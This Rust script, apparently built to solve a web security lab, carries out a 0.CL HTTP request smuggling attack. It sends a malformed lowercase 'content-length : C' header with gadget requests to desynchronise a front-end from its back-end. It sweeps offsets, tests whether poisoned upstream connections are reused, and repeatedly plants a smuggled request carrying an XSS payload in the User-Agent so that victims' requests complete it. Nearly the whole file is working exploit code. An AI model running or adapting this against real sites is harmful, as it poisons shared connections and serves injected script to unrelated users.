#!/usr/bin/env rust-script
//! name: pool_window
//! description: 0.CL 上游池回收时序探针 - 先在同一前端打毒(A 带全小写 `content-length : C` 让后端吃体,B 带早答 gadget 头块 + filler + 截断的 smuggled 请求),随即优雅关闭或闲置攻击连接,再以全新连接在给定延迟档发带信标查询串的探针,逐档分类回执(状态行/字节/残留帖子页/XSS 载荷回显/SVG 缺失)判定「毒化上游连接能否被后到连接继承」;plant 模式按同一毒化反复种植并等待受害者请求补完,末尾读横幅。
//! version: 1.0.0
//! args: <base-url> --mode sweep|window|plant [--c N] [--c-delta 35] [--cl-from N] [--cl-to N] [--cl-step N] [--filler-crlf N] [--delays 500,1000,2000,3000,5000,8000,12000] [--reps N] [--rounds N] [--hold close|idle|both] [--post-id 1] [--seed-id 2] [--ua PAYLOAD] [--salt S] [--gadget-prefix P] [--cache-path P] [--drain-ms 900] [--probe-ms 3000] [--probe-retries 2] [--victim-wait-ms 6000] [--banner] [--dump] [--selftest]
//! keywords: smuggling, 0cl, desync, response-queue, pool, reuse, timing, xss, tls
//!
//! ```cargo
//! [dependencies]
//! rustls = "0.23"
//! webpki-roots = "0.26"
//! url = "2"
//! ```

use pi_rust_lib::serde_json::{json, Value};
use pi_rust_lib::timeout;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::sync::Arc;
use std::time::{Duration, Instant};
use url::Url;

type Tls = rustls::StreamOwned<rustls::ClientConnection, TcpStream>;

fn connect(host: &str, port: u16) -> Result<Tls, String> {
    let mut roots = rustls::RootCertStore::empty();
    roots.extend(webpki_roots::TLS_SERVER_ROOTS.iter().cloned());
    let config = rustls::ClientConfig::builder().with_root_certificates(roots).with_no_client_auth();
    let name = rustls::pki_types::ServerName::try_from(host.to_string()).map_err(|e| format!("sni: {e}"))?;
    let tcp = TcpStream::connect((host, port)).map_err(|e| format!("connect: {e}"))?;
    let _ = tcp.set_nodelay(true);
    let conn = rustls::ClientConnection::new(Arc::new(config), name).map_err(|e| format!("tls: {e}"))?;
    let mut s = rustls::StreamOwned::new(conn, tcp);
    {
        let rustls::StreamOwned { conn, sock } = &mut s;
        conn.complete_io(sock).map_err(|e| format!("handshake: {e}"))?;
    }
    s.sock.set_read_timeout(Some(Duration::from_millis(120))).map_err(|e| format!("timeout: {e}"))?;
    Ok(s)
}

/// Graceful TLS shutdown (close_notify) so the front-end sees an orderly close
/// and may return its upstream connection to the pool instead of tearing it down.
fn graceful_close(mut s: Tls) {
    s.conn.send_close_notify();
    let rustls::StreamOwned { conn, sock } = &mut s;
    let _ = conn.complete_io(sock);
    drop(s);
}

fn drain(s: &mut Tls, total_ms: u64, idle_ms: u64) -> Vec<u8> {
    let start = Instant::now();
    let mut buf: Vec<u8> = Vec::new();
    let mut last = Instant::now();
    let mut chunk = [0u8; 16384];
    loop {
        timeout::check();
        if start.elapsed() >= Duration::from_millis(total_ms) {
            break;
        }
        match s.read(&mut chunk) {
            Ok(0) => break,
            Ok(n) => {
                buf.extend_from_slice(&chunk[..n]);
                last = Instant::now();
            }
            Err(_) => {
                if !buf.is_empty() && last.elapsed() >= Duration::from_millis(idle_ms) {
                    break;
                }
                if buf.is_empty() && idle_ms == 0 {
                    break;
                }
            }
        }
    }
    buf
}

fn classify(buf: &[u8], ua: &str) -> Value {
    let text = String::from_utf8_lossy(buf).to_string();
    let mut statuses: Vec<String> = Vec::new();
    for (off, _) in text.match_indices("HTTP/1.") {
        let rest = &text[off..];
        let end = rest.find("\r\n").unwrap_or(rest.len());
        let line = &rest[..end];
        let mut it = line.split(' ');
        let ver = it.next().unwrap_or("");
        let code = it.next().unwrap_or("");
        if ver.starts_with("HTTP/1.") && code.len() == 3 && code.chars().all(|c| c.is_ascii_digit()) {
            statuses.push(line.to_string());
        }
    }
    let post_page = text.contains("Leave a comment") || text.contains("name=\"userAgent\"") || text.contains("name=userAgent");
    let total = text.chars().count();
    let tail: String = text.chars().skip(total.saturating_sub(300)).collect();
    json!({
        "bytes": buf.len(),
        "statuses": statuses,
        "status_count": statuses.len(),
        "post_page": post_page,
        "xss_hit": text.contains("<script>alert"),
        "svg": text.contains("<svg") || text.contains("image/svg"),
        "ua_echo": !ua.is_empty() && text.contains(ua),
        "head": text.chars().take(120).collect::<String>(),
        "tail": tail,
    })
}

/// A probe is clean when it looks like the plain cache-path resource: one 200,
/// SVG bytes present, no leaked post page.
fn probe_clean(v: &Value) -> bool {
    v["status_count"].as_u64() == Some(1)
        && v["statuses"][0].as_str().unwrap_or("").contains(" 200 ")
        && v["svg"].as_bool().unwrap_or(false)
        && !v["post_page"].as_bool().unwrap_or(false)
        && !v["xss_hit"].as_bool().unwrap_or(false)
}

fn arg_val(argv: &[String], key: &str) -> Option<String> {
    let mut i = 0;
    while i < argv.len() {
        if argv[i] == key {
            return argv.get(i + 1).cloned();
        }
        i += 1;
    }
    None
}

fn arg_num<T: std::str::FromStr>(argv: &[String], key: &str, dflt: T) -> T {
    arg_val(argv, key).and_then(|v| v.parse().ok()).unwrap_or(dflt)
}

struct Ctx {
    host: String,
    post_id: String,
    seed_id: String,
    ua: String,
    salt: String,
    filler_crlf: usize,
    gadget: String,
    cache_path: String,
}

/// The attacker pair: A carries the malformed lowercase `content-length : C`
/// (front-end ignores it, back-end eats C bytes of what follows); B is the
/// early-answer gadget request whose header block is what gets eaten, followed
/// by filler CRLFs, a complete revealed request and a truncated smuggled one.
fn build(ctx: &Ctx, c: u64, tag: &str) -> (String, String, usize, usize) {
    let t = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nUser-Agent: {}", ctx.post_id, ctx.host, ctx.ua);
    let r = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\n\r\n", ctx.seed_id, ctx.host);
    let filler = "\r\n".repeat(ctx.filler_crlf);
    let body = format!("{filler}{r}{t}");
    let m = body.len();
    let gurl_a = format!("{}{}{}", ctx.gadget, ctx.salt, tag);
    let gurl_b = format!("{}?b={}{}", ctx.cache_path, ctx.salt, tag);
    let hdr_b = format!("GET {gurl_b} HTTP/1.1\r\nHost: {}\r\nContent-Length: {m}\r\nConnection: keep-alive\r\n\r\n", ctx.host);
    let a = format!("GET {gurl_a} HTTP/1.1\r\nHost: {}\r\ncontent-length : {c}\r\nConnection: keep-alive\r\n\r\n", ctx.host);
    let b = format!("{hdr_b}{body}");
    (a, b, hdr_b.len(), m)
}

fn probe_req(ctx: &Ctx, path: &str, beacon: &str) -> String {
    format!("GET {path}?{beacon}=1 HTTP/1.1\r\nHost: {}\r\nConnection: keep-alive\r\nAccept: */*\r\n\r\n", ctx.host)
}

fn banner_solved(host: &str, port: u16, _ctx: &Ctx) -> Value {
    let req = format!("GET / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", host);
    match connect(host, port) {
        Ok(mut s) => {
            let _ = s.write_all(req.as_bytes());
            let _ = s.flush();
            let b = drain(&mut s, 3000, 500);
            let text = String::from_utf8_lossy(&b).to_string();
            json!({
                "bytes": b.len(),
                "is_solved_class": text.contains("is-solved"),
                "congrats": text.contains("Congratulations") || text.contains("congratulations"),
            })
        }
        Err(e) => json!({"error": e}),
    }
}

fn main() {
    let argv: Vec<String> = std::env::args().skip(1).collect();
    if argv.iter().any(|a| a == "--selftest") {
        let ua = "POC</script>";
        let post = classify(b"HTTP/1.1 200 OK\r\n\r\nname=\"userAgent\" <script>alert(1)</script>", ua);
        let css = classify(b"HTTP/1.1 200 OK\r\nContent-Type: image/svg+xml\r\n\r\n<svg></svg>", ua);
        let bad = classify(b"HTTP/1.1 400 Bad Request\r\n\r\n", ua);
        let ok = post["post_page"] == true
            && post["xss_hit"] == true
            && probe_clean(&css)
            && !probe_clean(&post)
            && !probe_clean(&bad)
            && bad["statuses"][0] == "HTTP/1.1 400 Bad Request";
        pi_rust_lib::report::success(
            "pool_window",
            json!({"selftest": if ok {"ok"} else {"fail"}, "post": post, "svg": css, "bad": bad}),
            "classifier + clean-probe oracle are the pure root",
        )
        .unwrap_or(());
        return;
    }
    let mut base = String::new();
    for a in &argv {
        if !a.starts_with("--") {
            base = a.clone();
            break;
        }
    }
    if base.is_empty() {
        pi_rust_lib::report::failure(
            "pool_window",
            "usage: pool_window <base-url> --mode window [--c 300] [--delays 500,1000,...]",
            "pass the lab instance base URL and a mode",
        );
        std::process::exit(2);
    }
    let parsed = Url::parse(&base).unwrap_or_else(|_| Url::parse("https://invalid/").unwrap());
    let host = arg_val(&argv, "--host").unwrap_or_else(|| parsed.host_str().unwrap_or("").to_string());
    let port = parsed.port().unwrap_or(443);
    let mode = arg_val(&argv, "--mode").unwrap_or_else(|| "window".to_string());
    let hold = arg_val(&argv, "--hold").unwrap_or_else(|| "close".to_string());
    let c_opt: Option<u64> = arg_val(&argv, "--c").and_then(|v| v.parse().ok());
    let c_delta: u64 = arg_num(&argv, "--c-delta", 35);
    let probe_retries: u64 = arg_num(&argv, "--probe-retries", 2);
    // 信标长度参与头块长度,而 C 又必须匹配头块长度:所有模式统一用定宽 hex 信标,
    // 这样 sweep 找到的 C 直接适用于 window/plant。
    let tag_len: usize = arg_num(&argv, "--tag-len", 6);
    let mut counter: u64 = 0;
    let filler_crlf: usize = arg_num(&argv, "--filler-crlf", 0);
    let reps: u64 = arg_num(&argv, "--reps", 1);
    let rounds: u64 = arg_num(&argv, "--rounds", 20);
    let drain_ms: u64 = arg_num(&argv, "--drain-ms", 900);
    let probe_ms: u64 = arg_num(&argv, "--probe-ms", 3000);
    let victim_wait_ms: u64 = arg_num(&argv, "--victim-wait-ms", 6000);
    let dump = argv.iter().any(|a| a == "--dump");
    let no_read = argv.iter().any(|a| a == "--no-read");
    let delays: Vec<u64> = arg_val(&argv, "--delays")
        .unwrap_or_else(|| "500,1000,2000,3000,5000,8000,12000".to_string())
        .split(',')
        .filter_map(|v| v.trim().parse().ok())
        .collect();
    let ctx = Ctx {
        host: host.clone(),
        post_id: arg_val(&argv, "--post-id").unwrap_or_else(|| "1".to_string()),
        seed_id: arg_val(&argv, "--seed-id").unwrap_or_else(|| "2".to_string()),
        ua: arg_val(&argv, "--ua").unwrap_or_else(|| "POC</script><script>alert(1)</script>".to_string()),
        salt: arg_val(&argv, "--salt").unwrap_or_else(|| "k".to_string()),
        filler_crlf,
        gadget: arg_val(&argv, "--gadget-prefix").unwrap_or_else(|| "/resources/images/blog.svg?a=".to_string()),
        cache_path: arg_val(&argv, "--cache-path").unwrap_or_else(|| "/resources/images/blog.svg".to_string()),
    };
    let (_, sample_b, sample_hdr, sample_body) = build(&ctx, c_opt.unwrap_or(0), "sample");
    let mut out = json!({
        "url": base, "host": host, "mode": mode, "hold": hold,
        "c_override": c_opt, "c_delta": c_delta, "tag_len": tag_len,
        "filler_crlf": filler_crlf, "b_len": sample_b.len(), "b_header_len": sample_hdr,
        "b_body_len": sample_body, "delays": delays,
    });

    // 偏移是「B 的头块长度 + 前端自己加的字节」:tag 长度一变头块长度就变,
    // 所以窗口/种植两模式按每轮实际头块长度现算 c,不再钉死绝对值。
    let c_list: Option<Vec<u64>> = arg_val(&argv, "--c-list").map(|v| {
        v.split(',').filter_map(|x| x.trim().parse().ok()).collect()
    });
    let plant = |ctx: &Ctx, tag: &str, c_over: Option<u64>| -> Result<(Value, Tls, u64), String> {
        let (_, _, hl, _) = build(ctx, 0, tag);
        let cc = c_over.or(c_opt).unwrap_or(hl as u64 + c_delta);
        let (a, b, _, _) = build(ctx, cc, tag);
        let mut s = connect(&ctx.host, port)?;
        let both = format!("{a}{b}");
        s.write_all(both.as_bytes()).map_err(|e| e.to_string())?;
        let _ = s.flush();
        let resp = drain(&mut s, drain_ms, 300);
        Ok((classify(&resp, &ctx.ua), s, cc))
    };

    if mode == "sweep" {
        let lo: u64 = arg_num(&argv, "--cl-from", sample_hdr.saturating_sub(30) as u64);
        let hi: u64 = arg_num(&argv, "--cl-to", (sample_hdr + 120) as u64);
        let step: u64 = arg_num(&argv, "--cl-step", 4);
        let mut rows: Vec<Value> = Vec::new();
        let mut boundaries: Vec<u64> = Vec::new();
        let mut c = lo;
        while c <= hi {
            for rep in 0..reps {
                timeout::check();
                let (a, b, hdr_len, body_len) = build(&ctx, c, &format!("{:0width$x}", counter, width = tag_len));
                counter += 1;
                let r = (|| -> Result<Value, String> {
                    let mut s = connect(&host, port)?;
                    let both = format!("{a}{b}");
                    s.write_all(both.as_bytes()).map_err(|e| e.to_string())?;
                    let _ = s.flush();
                    let resp = drain(&mut s, drain_ms, 300);
                    let mut v = classify(&resp, &ctx.ua);
                    if dump {
                        v["raw"] = json!(String::from_utf8_lossy(&resp).chars().take(1000).collect::<String>());
                    }
                    Ok(v)
                })();
                match r {
                    Ok(v) => {
                        let hit = v["post_page"].as_bool().unwrap_or(false);
                        if hit {
                            boundaries.push(c);
                        }
                        rows.push(json!({"c": c, "rep": rep, "hdr_len": hdr_len, "body_len": body_len,
                            "post_page": v["post_page"], "xss_hit": v["xss_hit"], "statuses": v["statuses"], "bytes": v["bytes"], "head": v["head"], "tail": v["tail"]}));
                    }
                    Err(e) => rows.push(json!({"c": c, "rep": rep, "error": e})),
                }
            }
            c += step;
        }
        out["rows"] = json!(rows);
        out["boundaries"] = json!(boundaries);
        pi_rust_lib::report::success(
            "pool_window",
            out,
            "boundaries lists the C values whose leftover parsed as the revealed post page - that C is the eaten-offset to reuse",
        )
        .unwrap_or(());
        return;
    }

    if mode == "window" {
        // baseline: what a clean probe looks like before any poisoning
        let mut baseline_rows: Vec<Value> = Vec::new();
        for attempt in 0..=probe_retries {
            timeout::check();
            let pr = probe_req(&ctx, &ctx.cache_path, &format!("{}base{attempt}", ctx.salt));
            let r = (|| -> Result<Vec<u8>, String> {
                let mut s = connect(&host, port)?;
                s.write_all(pr.as_bytes()).map_err(|e| e.to_string())?;
                let _ = s.flush();
                Ok(drain(&mut s, probe_ms, 500))
            })();
            match r {
                Ok(b) => {
                    let empty = b.is_empty();
                    let mut v = classify(&b, &ctx.ua);
                    v["attempt"] = json!(attempt);
                    v["clean"] = json!(!empty && probe_clean(&v));
                    v["empty"] = json!(empty);
                    baseline_rows.push(v);
                    if !empty {
                        break;
                    }
                }
                Err(e) => baseline_rows.push(json!({"attempt": attempt, "error": e})),
            }
        }
        out["baseline"] = json!(baseline_rows.clone());

        let passes: Vec<&str> = match hold.as_str() {
            "both" => vec!["close", "idle"],
            "idle" => vec!["idle"],
            _ => vec!["close"],
        };
        let mut rows: Vec<Value> = Vec::new();
        let mut traces: u64 = 0;
        let mut primes: u64 = 0;
        let mut idle_kept: Vec<Tls> = Vec::new();
        for pass in passes {
            for delay in &delays {
                for rep in 0..reps {
                    timeout::check();
                    let tag = format!("{:0width$x}", counter, width = tag_len);
                    counter += 1;
                    let (plant_cls, claimed, c_used) = match plant(&ctx, &tag, None) {
                        Ok(v) => v,
                        Err(e) => {
                            rows.push(json!({"pass": pass, "delay_ms": delay, "rep": rep, "error": e}));
                            continue;
                        }
                    };
                    let primed = plant_cls["post_page"].as_bool().unwrap_or(false)
                        || plant_cls["xss_hit"].as_bool().unwrap_or(false);
                    if primed {
                        primes += 1;
                    }
                    // 立即关闭(或闲置)攻击连接,让前端自己决定上游连接的去处
                    if pass == "close" {
                        graceful_close(claimed);
                    } else {
                        idle_kept.push(claimed);
                    }
                    std::thread::sleep(Duration::from_millis(*delay));
                    let mut probes: Vec<Value> = Vec::new();
                    let mut anomalies: u64 = 0;
                    let mut empties: u64 = 0;
                    for hop in 0..2u32 {
                        timeout::check();
                        let beacon = format!("{}p{pass}{delay}{rep}{hop}", ctx.salt);
                        let pr = probe_req(&ctx, &ctx.cache_path, &beacon);
                        let mut attempt: u64 = 0;
                        loop {
                            attempt += 1;
                            timeout::check();
                            let r = (|| -> Result<Vec<u8>, String> {
                                let mut s2 = connect(&host, port)?;
                                s2.write_all(pr.as_bytes()).map_err(|e| e.to_string())?;
                                let _ = s2.flush();
                                Ok(drain(&mut s2, probe_ms, 500))
                            })();
                            match r {
                                Ok(b) => {
                                    let clean = !b.is_empty() && probe_clean(&classify(&b, &ctx.ua));
                                    let mut v = classify(&b, &ctx.ua);
                                    v["hop"] = json!(hop);
                                    v["attempt"] = json!(attempt);
                                    v["clean"] = json!(clean);
                                    v["empty"] = json!(b.is_empty());
                                    if dump {
                                        v["raw"] = json!(String::from_utf8_lossy(&b).chars().take(700).collect::<String>());
                                    }
                                    let empty = b.is_empty();
                                    let retry_more = empty && attempt <= probe_retries;
                                    v["retried"] = json!(retry_more);
                                    probes.push(v);
                                    if retry_more {
                                        continue;
                                    }
                                    if empty {
                                        empties += 1;
                                    } else if !clean {
                                        anomalies += 1;
                                    }
                                    break;
                                }
                                Err(e) => {
                                    probes.push(json!({"hop": hop, "attempt": attempt, "error": e, "clean": false, "empty": false, "retried": attempt <= probe_retries}));
                                    if attempt > probe_retries {
                                        anomalies += 1;
                                        break;
                                    }
                                }
                            }
                        }
                    }
                    // 只有「收到了回执但不是干净资源页」才算被吃字节的痕迹;
                    // 空回执是前端抖动(基线也会空),单列不计。
                    let trace = anomalies > 0;
                    if trace {
                        traces += 1;
                    }
                    rows.push(json!({
                        "pass": pass, "delay_ms": delay, "rep": rep, "c_used": c_used,
                        "plant": plant_cls, "primed": primed,
                        "probes": probes, "anomalies": anomalies, "empties": empties, "trace": trace,
                    }));
                }
            }
        }
        out["rows"] = json!(rows);
        out["traces"] = json!(traces);
        out["primes"] = json!(primes);
        pi_rust_lib::report::success(
            "pool_window",
            out,
            "traces>0 means a fresh connection saw poisoned-upstream bytes (pool inheritance); traces==0 across all delays means the upstream binding is 1:1",
        )
        .unwrap_or(());
        return;
    }

    // plant mode: keep arming the trap and let the victim's own requests land in it
    let mut rows: Vec<Value> = Vec::new();
    let mut primes: u64 = 0;
    let mut victim_signs: u64 = 0;
    let mut last_err = String::new();
    for round in 0..rounds {
        timeout::check();
        let tag = format!("{:0width$x}", counter, width = tag_len);
        counter += 1;
        let c_this = c_list.as_ref().map(|l| l[round as usize % l.len()]);
        match plant(&ctx, &tag, c_this) {
            Ok((plant_cls, claim, c_used)) => {
                let primed = plant_cls["post_page"].as_bool().unwrap_or(false)
                    || plant_cls["xss_hit"].as_bool().unwrap_or(false);
                if primed {
                    primes += 1;
                }
                graceful_close(claim);
                std::thread::sleep(Duration::from_millis(victim_wait_ms));
                // 受害者窗口过后,用新连接读帖子页:落痕 = 该页带着补完痕迹/载荷回显
                // 受害窗口过后读帖子页;--no-read 时跳过,免得自己那一发把陷阱吃掉
                let page: Result<Value, String> = if no_read {
                    Ok(json!({"skipped": true}))
                } else {
                    (|| -> Result<Value, String> {
                        let mut s = connect(&host, port)?;
                        let req = format!("GET /post?postId={} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", ctx.post_id, host);
                        s.write_all(req.as_bytes()).map_err(|e| e.to_string())?;
                        let _ = s.flush();
                        let b = drain(&mut s, probe_ms, 500);
                        let mut v = classify(&b, &ctx.ua);
                        if dump {
                            v["raw"] = json!(String::from_utf8_lossy(&b).chars().take(900).collect::<String>());
                        }
                        Ok(v)
                    })()
                };
                let sign = page.as_ref().map(|v| v["post_page"].as_bool().unwrap_or(false)).unwrap_or(false);
                if sign {
                    victim_signs += 1;
                }
                rows.push(json!({"round": round, "c_used": c_used, "plant": plant_cls, "primed": primed, "post_page": page}));
            }
            Err(e) => {
                last_err = e.clone();
                rows.push(json!({"round": round, "error": e}));
            }
        }
    }
    let banner = if argv.iter().any(|a| a == "--banner") { banner_solved(&host, port, &ctx) } else { Value::Null };
    out["rows"] = json!(rows);
    out["primes"] = json!(primes);
    out["victim_signs"] = json!(victim_signs);
    out["banner"] = banner;
    out["last_error"] = json!(last_err);
    pi_rust_lib::report::success(
        "pool_window",
        out,
        "primes>0 means the poison landed; banner.is_solved_class true is the lab verdict",
    )
    .unwrap_or(());
}
